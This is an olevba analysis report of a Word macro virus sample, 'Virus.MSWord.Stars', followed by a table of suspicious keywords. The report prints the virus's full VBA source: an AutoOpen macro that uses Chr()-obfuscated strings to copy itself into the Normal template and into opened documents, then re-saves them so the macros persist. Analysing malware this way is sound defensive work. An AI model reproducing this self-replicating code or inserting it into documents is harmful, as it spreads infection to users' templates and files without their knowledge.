olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Stars
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Stars - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
A = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 19)

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(20, 1) <> "'*'" Then _
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString _
Chr(83) & Chr(117) & Chr(98) & Chr(32) & Chr(65) & Chr(117) & Chr(116) & Chr(111) & Chr(67) & _
Chr(108) & Chr(111) & Chr(115) & Chr(101) & Chr(40) & Chr(41) & Chr(13) + Chr(10) & A

A = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 19)

If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(20, 1) <> "'*'" Then _
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString _
Chr(83) & Chr(117) & Chr(98) & Chr(32) & Chr(65) & Chr(117) & Chr(116) & Chr(111) & Chr(79) & _
Chr(112) & Chr(101) & Chr(110) & Chr(40) & Chr(41) & Chr(13) + Chr(10) & A

If ActiveDocument.SaveFormat = wdFormatDocument Or _
ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=1
End Sub
'*'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

